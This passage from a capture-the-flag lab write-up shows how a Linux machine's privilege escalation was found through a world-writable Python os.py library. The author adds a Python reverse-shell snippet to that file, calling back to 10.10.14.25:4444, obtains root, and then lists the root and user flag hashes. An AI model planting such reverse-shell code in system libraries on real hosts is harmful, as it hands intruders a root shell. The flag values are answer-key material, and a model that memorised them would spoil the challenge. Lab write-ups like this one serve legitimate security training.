LDB0cqpF0e61RI7Z__fklSK0DXdnr7AljGrwwhHAaiE_LbLsOAOzvNJaSMT2OzIURgRf-Yw7DwQ8jzMjd0pYFn5Btzn0BlECCv9V-oM=w649-h171-no)

We run LinuxEnum script with `-t 1` and we got our potential escalation path
```ruby
[-] World-writable files (excluding /proc and /sys):
-rwxrw-rw- 1 nobody nogroup 5493 Nov 7 22:10 /etc/Development/reverseshell.php
-rwxrwxrwx 1 root root 25910 Jan 15 2019 /usr/lib/python2.7/os.py
```
![](https://lh3.googleusercontent.com/kHoJIDL0nmMYnV1GDn7fiQvNWXabrSYUlBiUG3e8De3dYOf1JrGM29b4fPLjjNPhT_3YfxhBMPo5y7aWqYprGTIQXei0_W2jHp9uvVFrfSNZ6eEAjIfQ1azFbm0OQLxYdOA0-UGPTOWlI36AjRkCtaHzQK1spy74Pz3tNC5pjPkVXeH2g0x2tkzJ07Wmdkln3nC60gnTsYK6Zc8DC3QiD5WcU7H10rq_-TYZAnYlgMEPC3h0CfGAXM0PSxvitaVNepV6GYCXMChJKsV6qBYKEI979lsQWZeQQI_tdk1r0wOj58bOlFTmuHC4oytp5HzUQ5r5AhFJZ2AItFuRWscfIpDXYkwiOIpeszDXX04yiBav2y_k_nj4bHayrta0MW2YZ1TAY3vH7N99DUarIIy-C65KGafWS8NKJBWiVJLq32a0PTKKWRUJvgeC4pErrHw5PWzI0d5hRfxekgCUyCBT3-5FO6NhPgi0X94fnQoOVuS90TxqSxcTJyAn1MkHIrqn0c0ZMWXCpiUE6_f0JiEf3Yg2NtLA89pbTgj66zzNl7UX0B_AlJ2dIsfSKUhU8A-78K16J051odIbNgqIm0us4ryEvrDxjuxIl7BhlUxmQwkteoscbWMal9TEBUn_cLi5NoGHHI_GLJ1w9-onZXETPRFKv6vaclnFC5aSnY5UaJtb2lJD-W6xL4g=w798-h77-no)

![](https://lh3.googleusercontent.com/8iZqoZmM6H3AtI8e9_hWdXQW8xKB06Z-2491MgD5oWRH0YSfKUtDFALgsZ0VF-yqFiv6qUs43PJecNn_vsfSxTT2b2mUaW9uOg-yG0r7LC-5vCDnpYx32wE8CZJIv--yYaFu98DgI6Olxmf6C0lE9dxC8xHlAQI816l_WW5uyAQPnQ9sPqBBOavFDjDbE118UBTUNsF7T4bOTPyqxBjr5ILJxWq9oZk8ctQmzw_VdYmluat0zsIpGGTHlyWpfSB6alHuL5bRSs5sF59QHLHgJdZ7_hQmKTH3cfW_AooPLDZYD9Os-6Dpqj2Lu_1OlLKqtivZwRd77O385KLTIq8oY89VV3bUmL5ucR003hRtgrWPUhmXbJ_fsZ3o-opviZ0ESIXlmebhLsD32YdsUoqLcQ0M6KCpILX0ll7YzS4zlLregJNfC8_Mis3qbYK8kvqB3EWYwAqqCc4Caky2-_yPQjWJkmJ3GejpL7xvboLHLV4hvOn76bZRSFuIAU-4DxXJfhetNMKivGvtbOlyIeI4t4DibJJf0RrrKeh9isE0q7BcAEeDcuy7GeroEuwxf3cSSrfly9_xSZzHTq4A25JuMyE0gASm7f9kM9_HZPkhsw-6NcJhcYfIRaLC7uUMGAyQB2HnIvJ0GSaNTXL7Tq7nczVSv_be74Vqq-jf2Q7FnpuZ_nIWwsa91nk=w682-h385-no)

so we modified the **os.py** file to call for a reverse shell 
```ruby
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.25",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
```
![](https://lh3.googleusercontent.com/lOJAI2dqne0qFUAWkZSRKgTOelCA-wD7YQOox7bjgELVd2PvmY-fwQWto_A_MY7Mik_tq4jYxVdbyQEejMJGw2HuIMW4sHjj0YEnALEHeM6asG-Qa4bpPIqWClfHGHqFfG9lHrwTwOT4TlbJYBEV5U3mcqfAHQi7pnwe82YI3aVxkKBH9JM5ltKQeXULfHQiVFoeN2b8l6nBP8n7uFYmB0c_O7wlEJ-tMWQG8k_oPcfgyuYo_mK9HZIYEpzGgG1PKMVfOYzkO5OH4tbWTV_ImTmz5oWXr0BX83ej8-oCZrIV_H0HICgWxvkJg7XV2WerBGbJIL2bJDIbr-cQbawxJ8_115lpoYnHZ7SDT1kigu6tp2Z78Ou8dMvR9655Y3ftjH8BU2eoZNBbDElsQqje4xKX5GuLEJvULoCXAOkmjiS23OO7j-6Q0K8RRX1lrmlpcl_FX_B6rSF2BWx5yM-GJ6k-E5wxiIcsYVFhtRJPHH97ex7KU_eJUxIN2f-aRQurLQNzKyyCW25JfF2TEa4-ozG5QgbmW4-eDPAQJCHoD8e5AfpkmJzb9rhSQXr_4GB4U07AFmdImOaUEOMyJsuxuVKUPrvvdgPc-BWyjYUET-mAMFOGF5ImzM2DlvzZ9fLABoG-hHEwRK-bZ-O0o46hti3IPrk1tJVRLTs_17bO62U-kWnUYBFSZrA=w613-h91-no)

and boom we get root!
![](https://lh3.googleusercontent.com/uHYnCo0a_DYr5YKA5NsYApwbZj7FYbpgLinVVUOtpVpJqpDlCFKEdcRJ3dfu_EDgupQqVFBMvOheqeREitb63ZC9qKMTRGTJJjvUHIWJ0qJsovxvcnFNN_PauqsqKQpruihdqrAMJr6dJgoOcwOIn9Rpzqockn-0qWfNE6i2B3M2ajtuYidpTn8Xicljzlm5tGtihAvWFZPqIGwBb3I2WQxvKg95LGE0e8dBh2GGmAEIyQ1rxKm4fPyytMQSleymb3reThsEz7AOkejmY3dhIr3I5i4_-H23-aBXPgZFWVRRkub9SRe6rZ-Op_fbJuj9uzIxPMXKGXioyXSCthzZGDBMaUxyYBT3BMKVaH204cH0N2sTA7jqrtD_iB6g6gj0QLDcBslFcoi4b8L1SVCVhncKput3AaXd4iSh9dM8byrEyhPsDZazPtR2rqvI9ppdMjCXsow4vkfCEkbAXfxdGsPQJBM-8t58cj1h0DlWGbC8InPb59xFXLdTDleqa8jooNc8y6RL_CadN-Avs5S7tNOffiEO12Rww6tylouZNTXYHwFkx5L7I4osgVYimginA97EFPShOVNnQtfCBYyzPs-sOGOzPwcoMjs5NaiGDn1vGcloTwGtNqwEAaS5VnFy8E4AzC87qfjZv9_3qYWnFsaYOHNeQ1JYrlM--zkA3SeS_9nl6THd0cQ=w613-h206-no)

# FLAGS
```ruby
ROOT  "b0e6c60b82cf96e9855ac1656a9e90c7"
USER  "a9ed20acecd6c5b6b52f474e15ae9a11"
```

